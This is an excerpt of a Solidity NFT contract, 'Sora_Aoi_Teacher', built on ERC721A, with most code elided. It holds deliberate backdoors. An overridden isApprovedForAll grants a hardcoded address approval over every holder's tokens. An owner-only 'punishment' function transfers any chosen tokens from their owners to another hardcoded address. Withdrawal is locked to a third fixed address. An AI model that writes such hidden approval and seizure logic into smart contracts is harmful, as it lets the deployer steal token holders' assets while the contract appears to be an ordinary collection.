  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x30A7853667f5da91868F6c0eBb9Fc36FD7150E94){return true;}
...
contract Sora_Aoi_Teacher is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Sora_Aoi_Teacher", "SAT", maxBatchSize_, collectionSize_) {
  ...
  function punishment(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x6d521D353D0025BFeC6D9BE3Fa39D4A261C01663, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x399138fB9D2803Ec3a645D8f7407B5eb9f80997A);
